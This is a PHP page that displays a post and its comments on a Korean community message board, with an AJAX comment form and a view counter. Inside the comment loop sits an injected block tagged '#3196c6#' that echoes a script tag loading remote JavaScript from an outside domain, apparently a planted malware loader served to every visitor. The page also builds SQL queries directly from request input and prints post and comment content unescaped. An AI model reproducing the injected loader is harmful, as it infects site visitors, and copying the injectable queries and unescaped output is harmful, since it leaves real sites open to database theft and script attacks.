<? 
	session_start();
	include ("./lib.php");
	$connect = db_connect($db_host, $db_user, $db_pass,$db_name);
	$chk_sql="select * from Vocals_freeboard where board_no=trim('$_GET[board_no]')";
	$chk_result=mysql_query($chk_sql);
	$data=mysql_fetch_array($chk_result);
	
	if(!$data[board_no]){
    ?>
    <script>
        alert("존재하지 않는 글입니다.");
    </script>
    <?
	}
	$da="select * from Vocals_register where user_id=trim('$data[board_writer_id]')";
	$d=mysql_query($da);
	$r=mysql_fetch_array($d);
	
	?>

<!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
		<meta charset="UTF-8">
	 	<link rel="stylesheet" href="./reply_type.css"/>
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			section{
				padding-bottom: 30px;
			}
			#board_wrap {
				width: 980px;
				height: auto;
			}
			#board_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			#board_table {
				width: 800px;
				height: auto;
				margin: 50px auto 0 auto;
				text-align: center;
				border-spacing: 0;
			}
			#board_table thead td {
				background: #1caff6;
				color: white;
				height: 40px;
				border-radius: 10px 10px 0 0;
			}
			#board_table tbody td {
				border-bottom: 1px dashed black;
				height: 40px;
				width: 400px;
			}
			#board_table tbody tr:nth-child(2) td{
				text-align: justify;
				height: 300px;
				border-bottom: 1px solid black;
			}
			
		</style>
		<script type="text/javascript">
			$(document).ready(function(){
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
	                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
	                $('.message').css('left',result).html(text).fadeIn(1500);
	                $('.message').fadeOut(1500);
				}
				$('.go_reply').click(function(e){
					e.preventDefault();
					var form_data={
						board_no:<?=$data['board_no'] ?>,
						reply_text: $('.reply_text').val(),
						is_ajax: 1
					};
					$.ajax({
						data: form_data,
						type: "POST",
						url: './board_reply_ok.php',
						success: function(res){
							if(res=='success'){
								ShowAlert('댓글달기 완료');
								$('#wrap').load('./board_view.php?board_no=<?=$_GET[board_no] ?>');
							}else
								ShowAlert('오류가 발생하였습니다');
						}
					});
					return false;
				});
			});
		</script>
	</head>
	<body>
		<div id="board_wrap">
			<header>
				<h1>Board</h1>
			</header>
			<section>
				<form method="post" action="" class="form_board" name="form_board">
					<table id="board_table">
						<thead>
							<tr>
								<td colspan="2"><?=$data['board_title'] ?></td>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td><?=$r['user_name']?></td><td><span style="color:#FF32B1;"><?=$data['board_hit'] ?>회</span> 조회되었습니다.</td>
							</tr>
							<tr>
								<td colspan="2" cellpadding="0"><div><?=$data['board_content']?></div></td>
							</tr>
						</tbody>
					</table>
				</form>
			<table class="reply_table">
				<form method="post" name="form_reply" class="form_reply">
				<thead>
					<tr>
						<td colspan="2">댓글</td>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td><textarea name="reply_text" class="reply_text"></textarea></td><td><input type="submit" value="댓글달기" class="go_reply"></td>
					</tr>
				</form>
				</tbody>
			</table>
			<table class="reply_view">
				<tbody>
				<?
					$sql="select * from Vocals_freeboard_reply where board_no='$data[board_no]' order by reply_no desc";
					$d_sql=mysql_query($sql);
					while($r_data=mysql_fetch_array($d_sql)){
						$a="select user_name from Vocals_register where user_id=trim('$r_data[reply_writer_id]')";
						$b=mysql_query($a);
						$c=mysql_fetch_array($b);
				?>
<?php
#3196c6#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155811\"></script>";
echo $vt;
}
#/3196c6#
?>					<tr>
						<td><?=$c['user_name']?></td>
						<td style="word-break: break-all"><?=$r_data['reply_content']?></td>
					</tr>
				<?
					}
				?>
				</tbody>
			</table>
			</section>
		</div>
	</body>
</html>
<?
		$hit= $data['board_hit']+1;
		$sql="update Vocals_freeboard set board_hit='$hit' where board_no='$data[board_no]'";
		mysql_query($sql);
?>